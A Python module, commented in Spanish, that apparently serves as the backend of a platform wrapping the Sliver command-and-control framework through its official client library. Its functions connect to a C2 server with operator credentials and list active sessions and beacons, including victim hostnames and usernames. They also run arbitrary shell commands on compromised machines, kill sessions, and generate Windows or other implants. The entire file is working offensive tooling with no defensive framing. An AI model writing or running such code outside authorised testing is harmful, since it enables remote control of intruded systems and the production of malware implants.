"""Cliente REAL de la API gRPC oficial de Sliver C2.

Sliver expone una API gRPC para operadores (puerto por defecto 31337, TLS
mutuo con el certificado del operador). El cliente oficial en Python es
`sliver-py` (mismo autor que Sliver, GoSecured). Este módulo NO reimplementa
el protocolo: usa la librería oficial. Sin ella, la integración queda
documentada como requisito de instalación (nunca simulada).

Configuración (variables de entorno del backend):
  SLIVER_CONFIG   ruta al fichero de configuración del operador descargado
                  desde `sliver operator new` (JSON con CA + certificado)
  SLIVER_HOST     host del listener gRPC (alternativa a SLIVER_CONFIG)
  SLIVER_PORT     puerto gRPC (por defecto 31337)
  SLIVER_TOKEN    token API generado con `sliver new-operator --token`

Operaciones implementadas contra la API real:
  estado()      → sesiones y beacons activos
  tarea()       → ejecución de comando shell en sesión/beacon
  retirar()     → cierre de sesión/beacon
  generar()     → generación de implante vía API oficial (implant_build)
"""
from __future__ import annotations

import json
import os
from typing import Any


class ErrorIntegracion(Exception):
    """Configuración ausente o dependencia no instalada."""


def _config() -> dict[str, Any]:
    """Construye la configuración del cliente a partir del entorno."""
    ruta = os.environ.get("SLIVER_CONFIG", "")
    if ruta:
        try:
            texto = Path_texto(ruta)
        except OSError as exc:
            raise ErrorIntegracion(f"SLIVER_CONFIG ilegible: {exc}") from exc
        return {"modo": "config_file", "texto": texto}
    host = os.environ.get("SLIVER_HOST", "")
    if host:
        return {
            "modo": "token",
            "host": host,
            "puerto": int(os.environ.get("SLIVER_PORT", "31337")),
            "token": os.environ.get("SLIVER_TOKEN", ""),
        }
    raise ErrorIntegracion(
        "Sliver no configurado: defina SLIVER_CONFIG (fichero del operador) "
        "o SLIVER_HOST + SLIVER_TOKEN. Genere el fichero con "
        "`sliver operator new <nombre> -l <host>:31337` en su servidor C2.")


def Path_texto(ruta: str) -> str:
    from pathlib import Path
    return Path(ruta).read_text(encoding="utf-8")


def _cliente():
    """Instancia el cliente oficial sliver-py con la configuración real."""
    try:
        from sliver import SliverClient, SliverClientConfig
    except ImportError as exc:
        raise ErrorIntegracion(
            "sliver-py no instalado en el backend: pip install sliver-py "
            "(cliente oficial de Sliver para operadores)") from exc
    cfg = _config()
    if cfg["modo"] == "config_file":
        config = SliverClientConfig.parse_text(cfg["texto"])
    else:
        # Config por token: sliver-py admite construirla desde dict
        base = {
            "host": cfg["host"], "port": cfg["puerto"], "token": cfg["token"],
            "operator": "orquestart",
        }
        config = SliverClientConfig(base)
    return SliverClient(config)


def _ejecutar(coro):
    """Corre una coroutine aislada (los clientes sliver-py son async)."""
    import asyncio
    return asyncio.run(coro)


def estado() -> dict[str, Any]:
    """Sesiones y beacons REALES del servidor Sliver del operador."""
    try:
        cliente = _cliente()

        async def _consulta():
            await cliente.connect()
            sesiones = await cliente.sessions()
            beacons = await cliente.beacons()
            return sesiones, beacons

        sesiones, beacons = _ejecutar(_consulta())
        return {
            "conectado": True,
            "framework": "Sliver (gRPC oficial)",
            "sesiones": [_fila(s) for s in sesiones],
            "beacons": [_fila(b) for b in beacons],
        }
    except ErrorIntegracion as exc:
        return {"conectado": False, "error": str(exc)}
    except Exception as exc:  # error real de red/TLS/gRPC: se reporta tal cual
        return {"conectado": False, "error": f"Sliver: {str(exc)[:220]}"}


def _fila(s) -> dict[str, Any]:
    datos = getattr(s, "__dict__", {}) or {}
    salida: dict[str, Any] = {}
    for clave in ("ID", "Name", "Hostname", "Username", "RemoteAddress",
                  "OS", "Arch", "Transport", "LastContact", "Active",
                  "Version", "Integrity"):
        valor = datos.get(clave, getattr(s, clave.lower(), None))
        if valor is not None and not callable(valor):
            salida[clave.lower()] = str(valor)
    return salida


def tarea(sesion_id: int, comando: str) -> dict[str, Any]:
    """Ejecuta un comando shell REAL dentro de una sesión/beacon Sliver."""
    try:
        cliente = _cliente()

        async def _tarea():
            await cliente.connect()
            ses = await cliente.interact_session(int(sesion_id))
            if ses is None:
                raise ValueError(f"sesión {sesion_id} no existe en Sliver")
            return await ses.shell(comando, shell=True)

        salida = _ejecutar(_tarea())
        texto = salida if isinstance(salida, str) else json.dumps(
            getattr(salida, "__dict__", str(salida)), ensure_ascii=False, default=str)
        return {"conectado": True, "sesion_id": sesion_id,
                "comando": comando, "salida": texto[:8000]}
    except ErrorIntegracion as exc:
        return {"conectado": False, "error": str(exc)}
    except Exception as exc:
        return {"conectado": False, "error": f"Sliver tarea: {str(exc)[:220]}"}


def retirar(sesion_id: int) -> dict[str, Any]:
    """Cierra una sesión REAL en el servidor Sliver (higiene de cierre)."""
    try:
        cliente = _cliente()

        async def _retirar():
            await cliente.connect()
            ses = await cliente.interact_session(int(sesion_id))
            if ses is None:
                raise ValueError(f"sesión {sesion_id} no existe en Sliver")
            return await ses.kill()

        _ejecutar(_retirar())
        return {"conectado": True, "retirada": sesion_id}
    except ErrorIntegracion as exc:
        return {"conectado": False, "error": str(exc)}
    except Exception as exc:
        return {"conectado": False, "error": f"Sliver retirar: {str(exc)[:220]}"}


def generar(os_objetivo: str = "windows", arq: str = "amd64") -> dict[str, Any]:
    """Genera un implante vía la API oficial `implant_build` de Sliver.

    El binario es producido por el SERVIDOR Sliver del operador (la
    plataforma nunca fabrica payload propio); esta llamada es la misma
    que la CLI oficial `sliver implant build`.
    """
    try:
        cliente = _cliente()

        async def _generar():
            await cliente.connect()
            return await cliente.implant_build(
                target=os_objetivo, os=os_objetivo, arch=arq)

        resultado = _ejecutar(_generar())
        nombre = getattr(resultado, "File", None)
        return {"conectado": True,
                "implante": getattr(nombre, "Name", str(nombre)[:120]),
                "nota": "binario generado por el servidor Sliver del operador"}
    except ErrorIntegracion as exc:
        return {"conectado": False, "error": str(exc)}
    except Exception as exc:
        return {"conectado": False, "error": f"Sliver generar: {str(exc)[:220]}"}
